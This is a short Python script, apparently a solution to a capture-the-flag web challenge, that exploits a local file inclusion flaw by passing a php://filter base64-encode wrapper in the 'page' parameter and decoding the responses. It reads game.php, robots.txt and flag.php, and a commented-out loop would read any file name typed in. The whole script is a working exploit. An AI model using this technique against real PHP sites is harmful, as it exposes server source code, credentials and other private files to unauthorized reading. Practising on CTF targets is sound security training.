import readline
import base64 as b64
import requests as rq

url = 'http://challs.xmas.htsp.ro:6004'

def lfi(filename):
	param = {'page': f'php://filter/convert.base64-encode/resource={filename}'}
	res = rq.get(url, params=param)
	try:
		print(b64.b64decode(res.text).decode())
	except:
		print(res.text)

#while True:
#	filename = input('file: ')
#	lfi(filename)


for f in ['game.php', 'robots.txt', 'flag.php']:
	lfi(f)
